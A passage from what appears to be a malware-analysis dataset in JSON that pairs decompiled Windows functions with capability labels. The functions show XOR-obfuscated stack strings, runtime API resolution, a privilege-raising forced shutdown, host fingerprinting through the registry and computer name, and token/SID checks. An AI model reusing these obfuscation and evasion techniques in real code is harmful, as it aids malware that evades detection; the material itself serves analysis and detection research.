lpszLongPath = *0x41cb28;\n    var_44h = 0x451d3449;\n    puVar9 = &lpDst;\n    for (iVar7 = 0x410; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_40h = 0x6a5a6c30;\n    var_3ch._0_2_ = 0x5921;\n    puVar9 = &ARG_0;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    stack0xffffffc3 = 0x7c451834;\n    var_35h = 0x366a686c;\n    puVar9 = &ARG_0;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_31h = 0x19341559;\n    var_2dh = 0x516c2d45;\n    puVar9 = &lpszShortPath;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_50h = 5;\n    var_3ch._2_1_ = 5;\n    var_29h = 0x5f59286a;\n    var_25h._0_1_ = 0x34;\n    var_25h._1_1_ = 0x58;\n    var_25h._2_1_ = 0x45;\n    var_21h = 0x286a576c;\n    var_1dh = 0x44340859;\n    var_19h = 0x4c6c3c45;\n    var_15h._0_1_ = 0x6a;\n    var_15h._1_2_ = 0x5920;\n    var_15h._3_1_ = 0x6c;\n    var_11h._0_1_ = 0x34;\n    var_60h = 0x456a346c;\n    var_5ch._0_1_ = 0x59;\n    var_25h._3_1_ = var_3ch._2_1_;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_64h = iVar7;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar3 != 0xcc3c4b) {\n            *(iVar8 + iVar7) = *(&var_60h + iVar8 % var_50h) ^ (iVar8 + iVar7)[&var_44h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_31h = var_31h & 0xff | 0x7e4c4e00;\n    var_2dh = 0x6c6e3336;\n    var_29h = 0x1d501451;\n    var_25h._0_1_ = 0x4c;\n    var_25h._1_1_ = 0x25;\n    var_25h._2_1_ = 0x36;\n    var_25h._3_1_ = 0x31;\n    var_21h = 0x42513e6e;\n    var_1dh = 0x744c4e50;\n    var_19h = 0x6e6e2336;\n    var_15h._0_1_ = 0x51;\n    var_15h._1_2_ = 0x5036;\n    var_58h = 0x36514c6e;\n    var_54h._0_1_ = 0x50;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    iVar8 = &var_31h + (1 - iVar7);\n    var_60h = iVar7;\n    lpszLongPath = iVar8;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0x7944f0) {\n            *(iVar3 + iVar7) = *(&var_58h + iVar3 % var_50h) ^ (iVar3 + iVar7)[iVar8];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar7, &lpszShortPath);\n    stack0xffffffec = 0x51454d4b;\n    var_ch = 0x4d586b26;\n    var_8h = 0x6b485143;\n    lpLibFileName = 0x51304d39;\n    puVar9 = &var_a0h;\n    for (iVar7 = 0x3c; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h._0_2_ = 0x6b48;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_94h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_50h = 6;\n    iVar8 = 0;\n    iVar7 = &var_11h + (1 - var_94h);\n    var_58h = var_94h;\n    lpszLongPath = iVar7;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0xc8d27c) {\n            *(iVar8 + var_94h) = *(&lpLibFileName + iVar8 % var_50h) ^ (iVar8 + var_94h)[iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_90h = &lpDst;\n    var_a0h = 0x3c;\n    var_8ch = &ARG_0;\n    var_84h = 3;\n    var_9ch = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_1dh = var_1dh & 0xff | 0x7c292000;\n    var_19h = 0x4169183a;\n    var_15h._0_1_ = 0x4f;\n    var_15h._1_2_ = 0x1a5d;\n    var_15h._3_1_ = 0x38;\n    var_11h._0_1_ = 0x5a;\n    var_ch = 0x76396173;\n    var_8h = CONCAT22(var_8h._2_2_, 0x5a54);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    iVar8 = &var_1dh + (1 - iVar7);\n    lpLibFileName = iVar7;\n    lpszLongPath = iVar8;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0x3a8b20) {\n            *(iVar3 + iVar7) = *(&var_ch + iVar3 % var_50h) ^ (iVar3 + iVar7)[iVar8];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0xc);\n    var_21h = var_21h & 0xff | 0x301b2a00;\n    var_1dh = 0x13c3902;\n    var_19h = 0x211b3616;\n    var_15h._0_1_ = 0x1c;\n    var_15h._1_2_ = 0xb3c;\n    var_15h._3_1_ = 2;\n    var_11h._0_1_ = 0x6e;\n    var_ch = 0x6e557379;\n    var_8h = CONCAT22(var_8h._2_2_, 0x7955);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    iVar8 = &var_21h + (1 - iVar7);\n    lpszLongPath = iVar8;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0x916abe) {\n            *(iVar3 + iVar7) = *(&var_ch + iVar3 % var_50h) ^ (iVar3 + iVar7)[iVar8];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    while( true ) {\n        var_98h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar8 = (*pcVar6)(&var_a0h);\n        if (iVar8 != 0) break;\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar8 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_58h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_60h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_64h);\n    (*pcVar6)(uVar2);\n    return 1;\n}\n",
        "token_count": 2989
    },
    "00407d86": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00407d86(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_36h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uchar var_20h;\n    uint var_1fh;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_60h = 0xf01faf00;\n    var_5ch = 0x505600;\n    var_58h = 0x8002700;\n    var_54h = 0xc2900;\n    var_50h = 0x56900;\n    var_4ch = 0x3ff00;\n    var_48h = 0x1c4200;\n    var_44h = 0x163e00;\n    var_10h = 0;\n    var_28h = 0x7b3f3d;\n    var_24h = 0x5c415b01;\n    var_20h = 0x3e;\n    var_1fh._0_2_ = 0x6f39;\n    var_18h = 0x52386f6f;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x55);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_28h - iVar5;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar6 != 0x495484) {\n            var_4h = 5;\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % 5) ^ (iVar11 + iVar5)[var_8h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xb);\n    var_30h = 0x83b4217;\n    var_2ch = 0x56271611;\n    var_28h = 0x1010926;\n    var_24h = 0x2374233;\n    var_20h = 0x26;\n    var_1fh._0_2_ = 0x230d;\n    var_1fh._2_1_ = 0x5b;\n    var_1fh._3_1_ = 0x52;\n    var_18h = 0x6c523742;\n    var_14h._0_2_ = 0x6452;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_30h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetCapture)();\n        iVar6 = lpLibFileName;\n        if (iVar7 != 0x803ca5) {\n            var_8h = 6;\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % 6) ^ (iVar11 + iVar5)[&var_30h - iVar5];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x15);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar10 = var_10h;\n    if (pcVar8 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        (*pcVar8)(&var_40h);\n        uVar3 = var_36h;\n        uVar2 = var_36h & 0xffffff;\n        var_36h = uVar2 | uVar10 << 0x18;\n        uVar9 = 0;\n        uVar1 = uVar10 & 0xff;\n        do {\n            if ((uVar1 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar2 << 0x18) == (&var_60h)[uVar9]) {\n                uVar10 = 1;\n            }\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 8);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar8)(uVar4);\n    return uVar10;\n}\n",
        "token_count": 1317
    },
    "00408ec7": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00408ec7(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar6 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar3 == 0x7a) &&\n           (puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_18h = puVar4,  puVar4 != NULL)) {\n            iVar3 = (*pcVar1)(hObject, 1, puVar4, dwBytes, &dwBytes);\n            if ((iVar3 != 0) &&\n               ((iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, &StringSid),  iVar3 != 0 &&\n                (StringSid != 0)))) {\n                var_34h = 0x6d62411f;\n                var_30h = 0x4f6c4c60;\n                var_2ch = 0x41615158;\n                var_28h = 0x4c696d7e;\n                var_24h._0_2_ = 0x4f41;\n                var_20h = 0x6d4f414c;\n                var_1ch._0_1_ = 0x51;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                do {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                    if (iVar5 != 0x3060e8) {\n                        var_10h = 5;\n                        *(iVar6 + iVar3) = *(&var_20h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x12);\n                iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar3, StringSid);\n                iVar6 = var_14h;\n                if (iVar5 == 0) {\n                    iVar6 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = var_18h;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar6;\n}\n",
        "token_count": 880
    },
    "00409031": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "modify access privileges",
            "shutdown system"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409031(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_34h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    int32_t var_4h;\n    \n    var_4h = 6;\n    var_34h._0_1_ = 6;\n    stack0xffffffc9 = 0x17211750;\n    var_2fh = 0x335a310c;\n    var_2bh = 0x3c0a3227;\n    var_27h = 0x7252d43;\n    var_23h._0_2_ = 0x301f;\n    var_23h._2_1_ = 0x35;\n    var_10h = 0x49443555;\n    var_ch._0_2_ = 0x7862;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0x655998) {\n            *(iVar5 + iVar3) = *(&var_10h + iVar5 % var_4h) ^ (iVar5 + iVar3)[&var_34h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar3, &lpLuid);\n    stack0xffffffdc = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &var_23h + 3, 0, 0, 0);\n    pcVar1 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar5 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    if (iVar5 == 0) {\n        (*pcVar1)(4, 0);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 649
    },
    "0040ac84": {
        "rules": [
            "contain obfuscated stackstrings",
            "create or open registry key",
            "contain loop",
            "set registry value",
            "query or enumerate registry value",
            "get hostname"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ac84(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x41098c;\n    uStack104 = *0x410988;\n    uStack108 = *0x410984;\n    name = *0x410980;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41cb44;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x410990;\n    uStack92 = *0x410994;\n    uStack88 = *0x410998;\n    uStack84 = *0x41099c;\n    var_3ch = *0x410970;\n    uStack60 = *0x410974;\n    uStack56 = *0x410978;\n    uStack52 = *0x41097c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar1)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar1)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar2)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar2)(hKey);\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar1)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar1)(uVar3);\n        *0x41cb4c = uVar10 ^ uVar8;\n        *0x41cb50 = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41cb44 = uVar8;\n        *0x41cb48 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1694
    },
    "0040b7e3": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040b7e3(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x14263c2c;\n    var_14h = 0x282b222a;\n    var_10h = 0x21232e1b;\n    var_ch._0_1_ = 0x47;\n    puVar5 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_20h = 0;\n    var_8h = 0x77474e4f;\n    var_4h._0_1_ = 0x41;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != 0xdd8fe5) {\n            var_1ch = 5;\n            *(iVar6 + iVar4) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar1 = var_20h;\n    if (iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar6 = fcn.00404313();\n        if (iVar6 == -0x69b4c9f2) {\n            uVar1 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 588
    },
    "0040cbc9": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040cbc9(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t hObject;\n    uint ARG_0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pSessionId;\n    uint *dwProcessId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint dwBytes;\n    int32_t TokenHandle;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_24h = 0x104;\n    var_10h = puVar3;\n    uVar2 = (*pcVar6)(8, 0x208);\n    var_ch = (*pcVar7)(uVar2);\n    var_20h = 0x104;\n    var_1ch = 0;\n    dwBytes = 0;\n    pSessionId = 0;\n    uVar2 = 0;\n    if ((puVar3 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_ch;\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar5 != 0) || (TokenHandle == 0)) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &dwBytes);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar5 == 0x7a) {\n                        uVar2 = (*pcVar6)(8, dwBytes);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*pcVar1)(TokenHandle, 1, dwProcessId, dwBytes, &dwBytes);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_30h);\n                                if (iVar5 != 0) {\n                                    var_60h = 0x36094131;\n                                    var_5ch = 0x41316367;\n                                    var_58h = 0x637b3605;\n                                    var_54h = 0x3676412c;\n                                    var_50h = 0x413e6368;\n                                    var_4ch = 0x63473669;\n                                    var_48h = 0x3669413e;\n                                    var_44h = 0x413e6347;\n                                    var_40h = 0x63503669;\n                                    var_3ch._0_2_ = 0x4162;\n                                    var_38h = 0x364c4162;\n                                    var_34h._0_2_ = 0x6334;\n                                    uVar2 = (*pcVar6)(8, 0x4d);\n                                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                    iVar8 = 0;\n                                    do {\n                                        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                                        if (iVar4 != 0x48524a) {\n                                            var_1ch = 6;\n                                            *(iVar8 + iVar5) =\n                                                 *(&var_38h + iVar8 % 6) ^ (iVar8 + iVar5)[&var_60h - iVar5];\n                                        }\n                                        iVar8 = iVar8 + 1;\n                                    } while (iVar8 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar5, var_ch, var_10h, 